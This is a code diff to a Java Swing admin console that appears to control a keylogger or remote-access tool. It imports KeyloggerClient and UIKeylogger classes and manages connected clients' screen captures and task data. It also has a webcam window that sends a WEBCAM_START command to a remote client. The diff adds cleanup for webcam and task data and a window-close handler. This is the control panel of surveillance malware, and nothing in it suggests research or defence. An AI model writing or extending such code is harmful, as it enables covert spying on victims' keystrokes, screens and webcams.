@@ -3,6 +3,8 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
+import java.awt.image.BufferedImage;
+import java.io.File;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.HashMap;
@@ -10,14 +12,8 @@ import java.util.Map;
 import javax.swing.*;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
-import javax.swing.tree.DefaultMutableTreeNode;
-
-import config.ConfigManager;
 import network.KeyloggerClient;
 import ui.UIKeylogger;
-
-import java.awt.image.BufferedImage;
-import java.io.File;
 
 public class AdminServerApp extends JFrame {
 
@@ -543,6 +539,11 @@ public class AdminServerApp extends JFrame {
             clientCards.remove(clientName);
             screenLabels.remove(clientName);
             latestScreens.remove(clientName);
+            bigScreenLabels.remove(clientName);
+            latestScreens.remove(clientName);
+            webcamLabels.remove(clientName);
+            controller.removeTaskData(clientName);
+            controller.removeWebcamData(clientName);
 
             clientGrid.revalidate();
             clientGrid.repaint();
@@ -557,6 +558,7 @@ public class AdminServerApp extends JFrame {
             clientCards.clear();
             latestScreens.clear();
             bigScreenLabels.clear();
+            webcamLabels.clear();
 
             clientGrid.revalidate();
             clientGrid.repaint();
@@ -1106,26 +1108,36 @@ public class AdminServerApp extends JFrame {
     }
 
     private void openWebcamWindow(String clientName) {
-        JFrame frame = new JFrame("Webcam - " + clientName);
-        JLabel previewLabel = new JLabel("Chờ hình ảnh...", SwingConstants.CENTER);
-        previewLabel.setOpaque(true);
-        previewLabel.setBackground(Color.BLACK);
-        previewLabel.setForeground(MUTED);
-        previewLabel.setFont(new Font("Consolas", Font.BOLD, 18));
-        previewLabel.setBorder(BorderFactory.createLineBorder(RED, 1));
+    JFrame frame = new JFrame("Webcam - " + clientName);
+    JLabel previewLabel = new JLabel("Chờ hình ảnh...", SwingConstants.CENTER);
+    previewLabel.setOpaque(true);
+    previewLabel.setBackground(Color.BLACK);
+    previewLabel.setForeground(MUTED);
+    previewLabel.setFont(new Font("Consolas", Font.BOLD, 18));
+    previewLabel.setBorder(BorderFactory.createLineBorder(RED, 1));
 
-        frame.add(previewLabel);
-        frame.setSize(420, 340);
-        frame.setLocationRelativeTo(this);
-        frame.setVisible(true);
+    frame.add(previewLabel);
+    frame.setSize(420, 340);
+    frame.setLocationRelativeTo(this);
+    frame.setVisible(true);
 
-        // Đăng ký label
-        controller.registerWebcamLabel(clientName, previewLabel);
+    // Đăng ký label
+    controller.registerWebcamLabel(clientName, previewLabel);
 
-        // Gửi lệnh tới client
-        controller.sendCommandToClient(clientName, "WEBCAM_START");
-        addLog("[WEBCAM] Requested webcam from " + clientName);
-    }
+    // ← ADD: Close handler
+    frame.addWindowListener(new WindowAdapter() {
+        @Override
+        public void windowClosing(WindowEvent e) {
+            System.out.println("[WEBCAM] Window closed for " + clientName);
+            controller.removeWebcamData(clientName);
+            frame.dispose();
+        }
+    });
+
+    // Gửi lệnh tới client
+    controller.sendCommandToClient(clientName, "WEBCAM_START");
+    addLog("[WEBCAM] Requested webcam from " + clientName);
+}
 
     private void openTaskManagerWindow(String clientName) {
     JFrame frame = new JFrame("Task Manager - " + clientName);
